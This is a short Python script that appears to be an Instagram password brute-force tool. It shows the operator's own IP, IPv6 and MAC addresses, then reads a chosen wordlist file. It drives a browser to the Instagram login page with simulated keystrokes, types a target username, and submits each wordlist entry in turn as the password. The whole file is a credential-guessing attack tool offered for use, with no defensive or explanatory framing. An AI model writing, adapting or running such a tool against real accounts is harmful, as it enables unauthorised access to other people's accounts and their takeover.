from os import system, remove
system("python modules\\py_modules.py")
from modules.py_modules import *


system("python network\\network.py")
from network.index_py import network
remove("network.json")
ip_address = network["ip_address"]
ipv6_address = network["ipv6_address"]
mac_address = network["mac_address"]
system("clear")

cprint("[+] ----------- your network info ----------- [+]", "cyan")
cprint("      ip address: "+ip_address, "cyan")
cprint("      ipv6 address: "+ipv6_address, "cyan")
cprint("      mac address: "+mac_address, "cyan")
cprint("[+] ----------------------------------------- [+]", "cyan")
cprint("")
cprint("")


target = input(colored("[+] target: ", "cyan"))
list = input(colored("[+] list: ", "cyan"))

file = open(f'libraries\\{list}.txt', 'r')
bruteforce = []
for line in file:
    line = line.strip()
    bruteforce.append(line)
file.close()

web = Browser()
keyboard = Controller()


web.go_to('www.instagram.com')
sleep(1)
keyboard.press(Key.enter)
keyboard.release(Key.enter)
sleep(0.5)
keyboard.press(Key.tab)
keyboard.release(Key.tab)
keyboard.press(Key.tab)
keyboard.release(Key.tab)
sleep(0.5)
web.type(target)
keyboard.press(Key.tab)
keyboard.release(Key.tab)
for brute in bruteforce:
    system("clear")
    web.type(brute, into="Password")
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
